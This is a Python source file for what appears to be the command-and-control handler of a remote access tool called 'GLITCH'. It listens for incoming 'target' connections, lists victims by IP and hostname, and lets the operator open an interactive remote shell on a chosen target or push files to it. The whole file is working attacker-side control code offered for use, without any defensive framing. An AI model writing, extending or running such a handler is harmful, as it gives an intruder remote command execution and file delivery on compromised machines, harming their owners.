#!/usr/bin/env python

import os
import struct
from queue import Queue
import time
import threading
import socket
import sys
import signal
import ntpath

# Getting currunt path
currunt_path_temp = os.path.abspath(__file__)
currunt_path = os.path.split(currunt_path_temp)[0] + "/"

server_host = ""
server_port = ""

if (len(sys.argv) > 1):
    server_host = str(sys.argv[1])
    server_port = int(sys.argv[2])
else:
    print("\033[31mMissing arguments.\033[0m")
    print("\nUsage: glitch start handler <host> <port>")
    exit()


def Shutdownhandler(signum, frame):
    exit()


    # Set the signal handler
signal.signal(signal.SIGINT, Shutdownhandler)

print("\n")

# start handler

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()


class MultiServer(object):

    def __init__(self):
        self.host = server_host
        self.port = server_port
        self.socket = None
        self.all_connections = []
        self.all_addresses = []

    def print_help(self):
        for cmd, v in COMMANDS.items():
            print("{0}:\t{1}".format(cmd, v[0]))
        return

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print('\nQuitting gracefully')
        queue.task_done()
        queue.task_done()
        for conn in self.all_connections:
            try:
                conn.send("discon".encode("utf-8"))
                conn.shutdown(2)
                conn.close()
            except Exception as e:
                print('Could not close connection %s' % str(e))
                # continue
        self.socket.close()
        sys.exit(0)

    def socket_create(self):
        try:
            self.socket = socket.socket()
        except socket.error as msg:
            print("\033[31mSocket creation error: \033[0m" + str(msg))
            sys.exit(1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return

    def socket_bind(self):
        """ Bind socket to port and wait for connection from client """
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error as e:
            print("\033[31mSocket binding error: \033[0m" + str(e))
            time.sleep(5)
            self.socket_bind()
        return

    def accept_connections(self):
        """ Accept connections from multiple clients and save to list """
        for c in self.all_connections:
            c.close()
        self.all_connections = []
        self.all_addresses = []
        while 1:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)
                client_hostname = conn.recv(1024).decode("utf-8")
                address = address + (client_hostname,)
            except Exception as e:
                print('\033[31mError accepting connections: %s\033[0m' % str(e))
                # Loop indefinitely
                continue
            self.all_connections.append(conn)
            self.all_addresses.append(address)
            print('\033[32m\n\nNew connection has been established with {0} ({1})\033[0m\n\n\033[33mGLITCH::handler>\033[0m '.format(
                address[-1], address[0]), end="")

        return

    def start_shell(self):
        while (True):
            
            commend = input("\033[33mGLITCH::handler>\033[0m ")
            commend = commend.split()
            if commend[0] == 'help':
                exec(open(currunt_path + "Handler/src/scripts/help.py").read())
                continue
            elif commend[0] == 'list':
                self.list_connections()
                continue
            elif commend[0] == 'shutdown':
                self.quit_gracefully()
                exit()
                break
            elif commend[0] == 'select':
                if len(commend) > 1:
                    target, conn = self.get_target(commend[1])
                    self.target_controller(target, conn)
                else:
                    print("Usage: select <index>")
                    print(
                        'Tip: use \"list\" commend to display target with index.')
            else:
                print("\033[31mInvalid syntex.\033[0m")
                continue
        return

    def list_connections(self):
        """ List all connections """
        print('                                Targets                                ')
        print('+------------+--------------------+--------------+---------------------+')
        print('| Index      | IP                 | UNKNOWN      | Name                |')
        print('+------------+--------------------+--------------+---------------------+')

        for i, conn in enumerate(self.all_connections):
            try:
                conn.send(" ".encode("utf-8"))
            except:
                del self.all_connections[i]
                del self.all_addresses[i]
                continue

            print(
                "     "+str(i)+"          " + str(self.all_addresses[i][0])+"         "+str(self.all_addresses[i][1]) + "          " + str(self.all_addresses[i][2]))
        print('+------------+--------------------+--------------+---------------------+')
        return

    def get_target(self, target):
        """ Select target client
        :param cmd:
        """
        try:
            target = int(target)
        except:
            print('\033[31mTarget index should be an integer.\033[0m')
            return None, None
        try:
            conn = self.all_connections[target]
        except IndexError:
            print('\033[31mNot a valid index\033[0m')
            print(
                '\033[31mTip: use\033[0m list\033[31m commend to display target with index.\033[0m')
            return None, None
        print("You are now connected to " + str(self.all_addresses[target][2]))
        return target, conn

    def read_command_output(self, conn):
        """ Read message length and unpack it into an integer
        :param conn:
        """
        raw_msglen = self.recvall(conn, 4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        # Read the message data
        return self.recvall(conn, msglen)

    def recvall(self, conn, n):
        """ Helper function to recv n bytes or return None if EOF is hit
        :param n:
        :param conn:
        """

        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def target_controller(self, target, conn):
        while True:
            command = input("\033[33mGLITCH::handler:" +
                            self.all_addresses[target][0] + "> \033[0m")

            command = command.split()
            if command[0] == "help":
                print("Commands:\n")
                print("   upload <path>  : Upload a file to target device.")
                print("   shell          : Get the shell of target.")
                print("   help           : Display help menu (this).")
                print("   exit           : Exit the active connection menu.\n")
            elif command[0] == "upload":
                if len(command) > 1:
                    filepath = command[1].strip("'\"")
                    if os.path.isfile(filepath):
                        self.send_file_target(target, conn, filepath)
                    else:
                        print("\033[31mNo file found at " + filepath + ".\033[0m")    
                else:
                    print("\033[31mInvalid syntex.\nForget to specify file path\033[0m")
            elif command[0] == "shell":
                self.send_target_commands(target, conn)
            elif command[0] == 'exit':
                break
            else:
                print("\033[31mInvalid syntex.\033[0m")
                continue
        return

    def send_target_commands(self, target, conn):
        """ Connect with remote target client 
        :param conn: 
        :param target: 
        """
        conn.send("shell0".encode("utf-8"))
        cwd_bytes = self.read_command_output(conn)
        cwd = str(cwd_bytes, "utf-8")
        print(cwd, end="")
        while True:
            try:
                cmd = input()
                if cmd == 'exit':
                    conn.send(cmd.encode("utf-8"))
                    return
                elif len(cmd.encode("utf-8")) > 0:
                    conn.send(cmd.encode("utf-8"))
                    cmd_output = self.read_command_output(conn)
                    client_response = str(cmd_output, "utf-8")
                    print(client_response, end="")
            except Exception as e:
                print("Connection was lost %s" % str(e))
                break
        del self.all_connections[target]
        del self.all_addresses[target]
        return

    def send_file_target(self, target, conn, filePath):
        def path_leaf(path):
            head, tail = ntpath.split(path)
            return tail or ntpath.basename(head)
        conn.send("upload".encode("utf-8"))
        fileName = path_leaf(filePath)
        filesize = str(os.path.getsize(filePath))
        conn.send((fileName + "," + filesize).encode("utf-8"))
        # this recv use to ensure that line 275 conn.send and line 288 conn.send
        # are defiraint otherwise it will join together some time
        # ---------------------
        conn.recv(1)
        # ---------------------
        f = open(filePath, 'rb')
        print('\nStart Sending')
        l = f.read(1024)
        print('Sending......')
        while (l):
            conn.send(l)
            l = f.read(1024)
        f.close()
        print("Send file successfully\n")
        return


def create_workers():
    """ Create worker threads (will die when main exits) """
    server = MultiServer()
    server.register_signal_handler()
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True
        t.start()
    return


def work(server):
    """ Do the next job in the queue (thread for handling connections, another for sending commands)
    :param server:
    """
    while True:
        x = queue.get()
        if x == 1:
            server.socket_create()
            server.socket_bind()
            server.accept_connections()
        if x == 2:
            server.start_shell()
        queue.task_done()
    return


def create_jobs():
    """ Each list item is a new job """
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
    return


create_workers()
create_jobs()
